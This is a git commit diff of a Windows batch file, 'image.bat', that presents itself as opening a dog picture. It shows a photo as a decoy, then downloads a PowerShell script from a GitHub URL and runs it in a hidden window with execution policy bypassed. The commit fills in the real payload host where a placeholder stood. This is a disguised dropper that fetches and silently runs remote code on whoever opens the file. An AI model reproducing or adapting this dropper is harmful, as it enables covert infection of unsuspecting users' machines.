90cdf9338097776a5da1d20e5328e0e18c28fb15
0xdom <54208845+Real0xdom@users.noreply.github.com>
2023-10-03 21:42:25 +0530

    Update image.bat

--- image.bat
+++ image.bat
@@ -4,6 +4,6 @@ pushd %temp%
 powershell Invoke-WebRequest "https://static.onecms.io/wp-content/uploads/sites/24/2021/04/26/GettyImages-185743593-2000.jpg" -Outfile "doggy.jpg"
 doggy.jpg
 
-powershell Invoke-WebRequest -Uri site hosting your powershell script -OutFile .\power.ps1;
+powershell Invoke-WebRequest -Uri https://github.com/Real0xdom/HWI/blob/main/power.ps1 -OutFile .\power.ps1;
 
 start PowerShell -windowstyle hidden -NoProfile -ExecutionPolicy Bypass -file "power.ps1"
